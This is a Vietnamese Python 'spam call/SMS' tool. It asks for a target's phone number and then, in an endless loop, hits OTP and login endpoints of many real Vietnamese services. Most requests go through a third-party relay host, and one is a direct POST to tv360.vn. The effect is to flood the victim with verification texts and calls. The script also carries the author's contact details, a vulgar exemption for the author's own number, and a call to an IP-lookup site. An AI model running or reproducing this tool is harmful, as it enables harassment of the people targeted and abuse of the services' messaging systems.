#!/bin/NguyenDucMinh/VN/Python3
#Deobfuscator by Tool Crack
#============================

from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
time=datetime.now().strftime("%H:%M:%S")
import requests
import socket
from pystyle import *
#import màu
luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
red='\u001b[31;1m'
yellow='\u001b[33;1m'
green='\u001b[32;1m'
blue='\u001b[34;1m'
tim='\033[1;35m'
xanhlam='\033[1;36m'
xam='\033[1;30m'
black='\033[1;19m'
#Đánh Dấu Bản Quyền
vchh_tool = trang + "~" + trang + "[" + do + "+" + trang + "] " + trang + "=> "
hhoang = trang + "~" + trang + "[" + do + "÷" + trang + "] " + trang + "=> "
hoangdz = trang + "-------------------------------------------------------------------------"
#today nand clear
os.system('cls')
data_machine = []
today = date.today()
os.system('clear')
#daystime
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "http://kiemtraip.com/raw.php"
ip = get_ip_from_url(url)
a = " \033[1;97m[\033[1;31m🔥\033[1;97m] => "
def logo():
    os.system("cls" if os.name == "nt" else "clear")
    logo=f"""
\033[1;35m██╗  ██╗██╗   ██╗██╗   ██╗██╗  ██╗ ██████╗  █████╗ ███╗   ██╗ ██████╗   
\033[1;37m██║  ██║██║   ██║╚██╗ ██╔╝██║  ██║██╔═══██╗██╔══██╗████╗  ██║██╔════╝     
\033[1;35m███████║██║   ██║ ╚████╔╝ ███████║██║   ██║███████║██╔██╗ ██║██║  ███╗    
\033[1;37m██╔══██║██║   ██║  ╚██╔╝  ██╔══██║██║   ██║██╔══██║██║╚██╗██║██║   ██║
\033[1;35m██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝██║  ██║██║ ╚████║╚██████╔
\033[1;37m╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
╔═══════════════════════════════════════════════════════╗
{a}{yellow}Tool Spam Call - Sms V1
{a}{red}Bản Quyền: Vũ Công Huy Hoàng
{a}{blue}Zalo: 0326023566
{a}\033[1;35mFacebook:huyhoang.x.dev
{a}{luc}Box Support: 
╚═══════════════════════════════════════════════════════╝
  """
    print(logo)
#=======================[ NHẬP KEY ]=======================
os.system("cls" if os.name == "nt" else "clear")
logo()
list = ['0326023566']
print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => CTRL+C Để Dừng Tool")
print("\033[1;31m─────────────────────────────────────────────────────────")
while True:
    phone = input(" \033[1;97m[\033[1;31m🔥\033[1;97m] => Enter Phone: ")
    if phone in list:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => Đây Là Số Điện Thoại Của Admin, Spam Con Cặc!!")
        print("\033[1;31m─────────────────────────────────────────────────────────")
    else: 
        print(f" \033[1;97m[\033[1;31m🔥\033[1;97m] => Bắt Đầu Tấn Công: {phone}")
        print("\033[1;31m─────────────────────────────────────────────────────────")
        break
def dibabo(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/bibabo.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => DIBABO: Thành Công")
def concung(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/concung.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => CONCUNG: Thành Công")
def dongplut(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/dongplut.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => DONGPLUT: Thành Công")
def funring(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/funring.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => FUNRING: Thành Công")
def gapo(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/gapo.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => GAPO: Thành Công")
def gotadi(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/gotadi.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => GOTADI: Thành Công")
def kilo(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/kilo.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => KILO: Thành Công")
def moneyveo(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/moneyveo.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => MONEYVEO: Thành Công")
def oldfacebook(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/oldfacebook.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => FACEBOOK: Thành Công")
def phuclong(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/phuclong.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => PHUCLONG: Thành Công")
def swift247(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/swift247.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => SWIFT247: Thành Công")
def tienoi(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/tienoi.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => TIENOI: Thành Công")
def ubofood(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/ubofood.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => UBOFOOD: Thành Công")
def vamo(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/vamo.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => VAMO: Thành Công")
def vietid(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/vietid.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => VIETID: Thành Công")
def vietlott(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/vietlott.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => VIETLOOT: Thành Công")
def winmart(phone):
    rq = requests.get(f"https://apispamvjp.000webhostapp.com/api/winmart.php?phone={phone}").json()
    if rq['SUCCESS'] == 1:
        print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => WINMART: Thành Công")
def tv360(phone):
	requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
dem = 0
while True:
    dem = dem+1
    print(f" \033[1;97m[\033[1;31m🔥\033[1;97m] =>\033[1;35m Spam Lần {red}[{yellow}{dem}{red}]")
    dibabo(phone)
    concung(phone)
    dongplut(phone)
    funring(phone)
    gapo(phone)
    gotadi(phone)
    kilo(phone)
    moneyveo(phone)
    oldfacebook(phone)
    phuclong(phone)
    swift247(phone)
    tienoi(phone)
    ubofood(phone)
    vamo(phone)
    vietid(phone)
    vietlott(phone)
    winmart(phone)
    tv360(phone)
